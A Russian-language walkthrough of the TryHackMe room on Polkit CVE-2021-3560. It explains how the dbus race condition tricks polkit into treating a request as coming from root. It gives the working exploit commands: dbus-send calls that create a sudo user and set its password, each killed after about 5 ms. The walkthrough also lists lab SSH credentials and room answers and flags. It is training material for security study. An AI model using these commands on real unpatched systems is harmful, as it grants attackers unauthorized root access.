[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Polkit: CVE-2021-3560](https://tryhackme.com/r/room/polkit) 

Всего 5 заданий:
## Задание 1
Из-за служб, необходимых для работы этой уязвимости, для полного развертывания этой машины потребуется до трех минут.
Уделите время прочтению информации в следующих задачах, прежде чем пытаться эксплуатировать ее. 

Эксплойт, описанный в этой комнате, часто использует графический интерфейс рабочего стола. Для скорости мы будем 
использовать CLI. Для этой машины включен доступ через браузер; однако имейте в виду, что функциональность 
копирования/вставки будет работать только в том случае, если вы откроете цель на весь экран в браузере, отличном от 
Firefox. Если вы предпочитаете использовать SSH для себя; учетные данные для этого будут предоставлены в 
соответствующей задаче.    

#### Ответить на вопросы ниже
Нажмите зеленую кнопку «Запустить машину», чтобы запустить машину!
```commandline
Ответ не нужен
```

## Задание 2
Это первое поле на TryHackMe, использующее динамические флаги. Таким образом, это в значительной степени бета-версия,
поэтому, пожалуйста, сообщайте о любых ошибках MuirlandOracle на сервере TryHackMe Discord. 

Прежде чем продолжить, внимательно прочтите следующую информацию:

Заполнив поле, вы увидите флаг /root/root.txt. Он не будет похож на обычный флаг TryHackMe:

все в файле должно быть отправлено как флаг, включая любые символы или специальные знаки.
Этот флаг будет отличаться каждый раз, когда вы разворачиваете ящик. Каждый флаг может быть использован только один 
раз и истекает через шесть часов (так что не забудьте отправить его быстро!) 
После получения флага не отправляйте его напрямую в поле ответа TryHackMe. Динамические флаги следует отправлять на 
https://flag.muir.land/ . Этот сайт управляется автором комнаты и не связан напрямую с TryHackMe. 
Вам будет предложено предоставить три вида информации:
Ваше имя пользователя. Очень важно, чтобы оно совпадало с вашим именем пользователя TryHackMe!
Код ящика. В большинстве случаев он будет таким же, как код комнаты. Для этой комнаты код будет: polkit
Флаг

Если вы правильно отправите все три части информации, в верхней части страницы появится еще один флаг. Он будет в 
стандартном формате TryHackMe ( THM{HASH}). Вам следует отправить этот флаг в задание ниже, чтобы завершить комнату. 
 Если в ходе этого процесса возникнут какие-либо проблемы, пожалуйста, отправьте ping MuirlandOracle на Discord- 
сервер TryHackMe . Если возникнет проблема, которая является результатом неспособности прочитать информацию в этой 
задаче, она, скорее всего, будет проигнорирована, поэтому, пожалуйста, сначала внимательно прочтите информацию здесь. 

#### Ответить на вопросы ниже
Прочитайте информацию в задании.

Какой URL-адрес веб-сайта следует использовать для отправки динамических флагов?
```commandline
https://flag.muir.land/
```

## Задание 3
#### Обзор

В начале 2021 года исследователь по имени Кевин Бэкхаус обнаружил уязвимость повышения привилегий семилетней 
давности (с тех пор обозначенную как CVE -2021-3560) в утилите Linux polkit. К счастью, разные дистрибутивы Linux (и 
даже разные версии одних и тех же дистрибутивов) используют разные версии программного обеспечения, а это означает, 
что уязвимы только некоторые из них.

В частности, уязвимыми оказались следующие основные дистрибутивы:

- Red Hat Enterprise Linux 8
- Fedora 21 (или более поздняя версия)
- Тестирование Debian («Яблочко»)
- Ubuntu 20.04 LTS («Focal Fossa»)
Теперь все они должны были выпустить исправленные версии своих пакетов Polkit, однако если вы столкнетесь с одним из 
  этих дистрибутивов, то он все еще может быть уязвим, если не обновлялся в течение некоторого времени. 

В этой комнате мы сосредоточимся конкретно на Ubuntu 20.04. Canonical выпустила патч для своей версии polkit ( 
policykit-1), которая имеет номер версии 0.105-26ubuntu1.1. Последняя уязвимая версия, доступная в репозиториях apt 
для Focal Fossa, — 0.105-26ubuntu1, так что, если вы видите это, вам может повезти!  

apt list --installed | grep policykit-1Для проверки установленной версии polkit можно использовать :

Изображение, демонстрирующее установленную уязвимую версию polkit

Оригинальное описание этой уязвимости можно найти в посте Кевина Бэкхауса здесь .

#### Что такое Полкит?

Логично задать себе вопрос прямо сейчас: «Что такое polkit?»

Polkit является частью системы авторизации Linux. По сути, когда вы пытаетесь выполнить действие, требующее более 
высокого уровня привилегий, набор инструментов политики может быть использован для определения наличия у вас 
требуемых разрешений. Он интегрирован с systemd и гораздо более настраиваем, чем традиционная система sudo. 
Действительно, его иногда называют «sudo systemd».

При взаимодействии с polkit мы можем использовать pkexec, вместо sudo. Например, попытка запустить useraddкоманду 
pkexecв сеансе GUI приводит к появлению всплывающего окна с запросом учетных данных: 
- pkexec useradd test1234
- Демонстрация диалога аутентификации Polkit GUI

В сеансе CLI вместо этого мы получаем текстовую подсказку:
Демонстрация диалога аутентификации Polkit CLI

Подводя итог, можно сказать, что набор инструментов политики можно рассматривать как детализированную альтернативу 
более простой системе sudo. 

#### Чем уязвим Polkit?

Следующий логичный вопрос, конечно: «Как мы можем использовать polkit»?

Короткий ответ: вручную отправляя сообщения dbus в dbus-daemon (по сути, API, позволяющий разным процессам общаться 
друг с другом), а затем убивая запрос до того, как он будет полностью обработан, мы можем обмануть polkit, чтобы он 
авторизовал команду. Если вы не знакомы с демонами, они фактически являются фоновыми службами, работающими в Linux . 
dbus-daemon — это программа, работающая в фоновом режиме, которая является посредником между сообщениями между 
приложениями.    

Чтобы не загромождать комнату, мы не будем слишком углубляться в подробности, стоящие за этим (хотя настоятельно 
рекомендуется прочитать полную статью об уязвимости ). По сути, уязвимость можно свести к следующим шагам:  

Атакующий вручную отправляет сообщение dbus в accounts-daemon с запросом на создание новой учетной записи с 
разрешениями sudo (или, в более позднем варианте, на установку пароля для нового пользователя). Этому сообщению 
dbus-daemon присваивает уникальный идентификатор.  


Атакующий уничтожает сообщение после того, как polkit его получает, но до того, как polkit успевает обработать 
сообщение. Это фактически уничтожает уникальный идентификатор сообщения.

Polkit запрашивает у dbus-daemon идентификатор пользователя, отправившего сообщение, ссылаясь на (теперь удаленный) 
идентификатор сообщения. 

Демон dbus не может найти идентификатор сообщения, потому что мы его убили на шаге два. Он обрабатывает ошибку, 
отвечая кодом ошибки. 


Polkit неправильно обрабатывает ошибку и заменяет идентификатор пользователя на 0, т. е. на учетную запись root машины.
Полагая, что действие запросил пользователь root, polkit позволяет запросу пройти без возражений.
Короче говоря, уничтожая идентификатор сообщения до того, как dbus-daemon успеет предоставить polkit правильный 
идентификатор, мы используем плохую обработку ошибок в polkit, чтобы обмануть утилиту, заставив ее думать, что 
запрос был сделан всемогущим пользователем root.  

Если сейчас это вам не понятно, надеюсь, вы поймете это после того, как сами воспользуетесь возможностью выполнить эксплойт!

#### Ответить на вопросы ниже
В какой версии Ubuntu policykit-1 исправлена уязвимость CVE-2021-3560?
```commandline
0.105-26ubuntu1.1
```
Какую программу можно использовать для запуска команд от имени других пользователей через polkit?

```commandline
pkexec
```

## Задание 4
Мы рассмотрели теорию, теперь давайте посмотрим на ее применение!

Давайте попробуем добавить нового пользователя с именем attacker, с правами sudo и паролем Expl01ted. Просто 
прочтите эту информацию сейчас — у вас будет время попробовать ее в следующем задании! 

Сначала давайте рассмотрим сообщения dbus, которые нам нужно будет отправить:

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.
freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 
Эта команда вручную отправит сообщение dbus демону учетных записей, выведет ответ и создаст нового пользователя с 
именем attacker ( string:attacker) с описанием «Учетная запись Pentester» ( string:"Pentester Account") и членством 
в группе sudo, установленным на значение true (на которое ссылается флаг int32:1).  

Наше второе сообщение dbus установит пароль для новой учетной записи:

dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply 
/org/freedesktop/Accounts/UserUSER_ID org.freedesktop.Accounts.User.SetPassword string:'PASSWORD_HASH' string:'Ask 
the pentester'  
Это снова отправляет сообщение dbus демону учетных записей, запрашивая смену пароля для пользователя с указанным 
нами идентификатором (показан красным), хэш пароля, который нам нужно сгенерировать вручную, и подсказку («Спросите 
пентестера»).  

Поскольку это фактически состояние гонки, нам сначала нужно определить, сколько времени займет выполнение нашей 
команды. Давайте попробуем это с первым сообщением dbus: 
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts 
org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 


Это занимает 0,011 секунды или 11 миллисекунд. Это число будет немного отличаться каждый раз, когда вы запускаете 
команду; однако на предоставленной машине оно всегда должно быть около этого числа. 

Примечание: в течение первых пяти минут или около того после развертывания машина все еще загружает все в фоновом 
режиме, поэтому не пугайтесь, если поначалу время будет намного больше — просто продолжайте периодически запускать 
команду, пока она не даст вам время, похожее на результаты, указанные выше.  

Нам нужно завершить команду примерно на полпути выполнения. Пять миллисекунд обычно работают достаточно хорошо на 
предоставленной машине; однако имейте в виду, что это не точное значение. Вам может потребоваться изменить время сна 
или запустить команду несколько раз, прежде чем она сработает. Тем не менее, как только вы найдете время, которое 
работает, оно должно работать стабильно. Если вы изо всех сил пытаетесь получить рабочее время, поместите команду в 
цикл bash for и быстро пройдитесь по диапазону времен, как правило, это сработает довольно хорошо.

Давайте попробуем это. Нам нужно отправить сообщение dbus, а затем убить его примерно на полпути:
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.
freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $! 


Чтобы объяснить приведенную выше команду, мы отправили сообщение dbus в фоновом задании (используя амперсанд для 
фонового выполнения команды). Затем мы сказали ему заснуть на 5 миллисекунд ( sleep 0.005s), а затем завершить 
предыдущий процесс ( $!). Это успешно создало нового пользователя, добавив его в группу sudo.  
На этом этапе мы должны отметить, что идентификатор нового пользователя в этом случае равен 1000.

Теперь нам осталось только дать пользователю пароль, и все будет готово!

Здесь нам нужен хэш пароля, поэтому давайте сгенерируем хэш Sha512Crypt для выбранного нами пароля ( Expl01ted):
openssl passwd -6 Expl01ted


Используя openssl, мы генерируем пароль типа 6 (SHA512-crypt) и наш открытый текстовый пароль ( Expl01ted).

Теперь давайте закончим это! В прошлый раз сработало 5 миллисекунд, значит, должно сработать и здесь:
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply 
/org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword 
string:'$6$TRiYeJLXw8mLuoxS$UKtnjBa837v4gk8RsQL2qrxj.0P8c9kteeTnN.B3KeeeiWVIjyH17j6sLzmcSHn5HTZLGaaUDMC4MXCjIupp8.' 
string:'Ask the pentester' & sleep 0.005s; kill $!


С hop, su и a sudo -sмы получаем root!

Ответить на вопросы ниже
Прочитайте информацию выше
```commandline
Ответ не нужен
```

## Задание 5
Вы ознакомились с теорией, теперь пришло время попробовать самим!

Если вы хотите подключиться к целевой машине по SSH, учетные данные следующие:

Имя пользователя:tryhackme
Пароль:TryHackMe123!
В противном случае, пожалуйста, не стесняйтесь использовать доступ в браузере с правой стороны экрана. Имейте в виду,
что AttackBox может быть развернут в тандеме с целевой машиной. 

Выполните эксплойт CVE -2021-3560 и получите флаг от /root/root.txt!
Не забудьте отправить флаг, который вы найдете на коробке, на https://flag.muir.land/ , чтобы получить окончательный 
флаг для отправки ниже. 

Ответить на вопросы ниже
Корневой флаг
```commandline
THM{N2I0MTgzZTE4ZWQ0OGY0NjdiNTQ0NTZi}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)